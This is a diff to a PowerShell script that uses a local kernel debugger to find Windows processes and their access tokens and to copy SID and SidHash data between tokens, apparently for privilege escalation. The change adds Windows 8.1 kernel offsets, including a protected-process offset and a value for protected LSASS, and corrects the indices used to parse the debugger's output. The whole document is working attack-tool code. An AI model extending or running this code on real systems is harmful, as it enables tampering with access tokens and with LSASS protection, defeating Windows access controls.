@@ -95,6 +95,7 @@ Knowing these few facts we could:
 3. copy the contents of the SidHash 
 #>
 $symfix = ""
+$delta = 0
 Switch ($mode) {
     "1" { 
             $offset = "208"
@@ -111,7 +112,13 @@ Switch ($mode) {
             $sidHashOffset = "+0x0e8+0x010"
             $activeProcessLinksOffset = "0x2e8"
         }
-    "8.1" {# to do
+    "8.1" {
+            $delta = -6
+            $offset = "348"
+            $sidHashOffset = "+0x0e8+0x010"
+            $activeProcessLinksOffset = "0x2e8"
+            $protectedProcessOffset = "+0x67a" # Protection
+            $protectProcess = "L1 0x61" # LSASS with protection 0x61
         }
     "2r2" {# to do
         }
@@ -139,6 +146,7 @@ $chain = "$symfix
 !process 0 0 $Process"
 Write-InFile $buffer "$chain"
 $tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
+$tabSystem
 $tabFA = ($tabSystem -split ' ')                   
 $fi = [array]::indexof($tabFA,"PROCESS") + 1
 $processAddress = $tabFA[$fi]
@@ -166,9 +174,9 @@ dt -v -b nt!_TOKEN UserAndGroups $processTokenAddressAnded"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')    
-$fi = [array]::indexof($tabFA,"lkd>") + 31 #25
+$fi = [array]::indexof($tabFA,"lkd>") + 31 + $delta
 $structTOKENAddress = $tabFA[$fi]
-$fi = [array]::indexof($tabFA,"lkd>") + 21 #15
+$fi = [array]::indexof($tabFA,"lkd>") + 21 + $delta
 $elementsNumber = $tabFA[$fi]
 Write-Output "$elementsNumber elements"
 
@@ -177,9 +185,9 @@ dt -v -b nt!_SID_AND_ATTRIBUTES $structTOKENAddress"
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')    
-$fi = [array]::indexof($tabFA,"lkd>") + 43 #37
+$fi = [array]::indexof($tabFA,"lkd>") + 43 + $delta
 $structSIDANDATTRIBUTESAddress = $tabFA[$fi]
-$fi = [array]::indexof($tabFA,"lkd>") + 20 #14
+$fi = [array]::indexof($tabFA,"lkd>") + 20 + $delta
 $elementsNumber = $tabFA[$fi]
 Write-Output "struct _SID_AND_ATTRIBUTES memory address: $structSIDANDATTRIBUTESAddress - $elementsNumber elements"
 
@@ -188,7 +196,7 @@ $chain = "$symfix
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')    
-$fi = [array]::indexof($tabFA,"lkd>") + 17 #11
+$fi = [array]::indexof($tabFA,"lkd>") + 17 + $delta
 $sidValue = $tabFA[$fi]
 Write-Output "SID is: $sidValue"
 
@@ -207,7 +215,7 @@ $chain = "$symfix
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')    
-$fi = [array]::indexof($tabFA,"lkd>") + 17 #11
+$fi = [array]::indexof($tabFA,"lkd>") + 17 + $delta
 $sidValue = $tabFA[$fi]
 Write-Output "SID is: $sidValue"
 
@@ -227,7 +235,7 @@ $chain = "$symfix
 Write-InFile $buffer "$chain"
 $tabOffset = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabOffset -split ' ')            
-$fi = [array]::indexof($tabFA,"Hex:") + 11 #5
+$fi = [array]::indexof($tabFA,"Hex:") + 11 + $delta
 $formatTokenSidHashOffset = $tabFA[$fi]
 
 $chain = "$symfix
@@ -240,7 +248,7 @@ dt nt!_eprocess ActiveProcessLinks. ImageFileName $processAddress"
 Write-InFile $buffer "$chain"
 $tabSystem = Call-MemoryWalker $kd $file $fullScriptPath $symbols
 $tabFA = ($tabSystem -split ' ')                   
-$fi = [array]::indexof($tabFA,"[") + 7 #1
+$fi = [array]::indexof($tabFA,"[") + 7 + $delta
 $processAddress = $tabFA[$fi]
 Write-Output "$Process memory address found!"
 
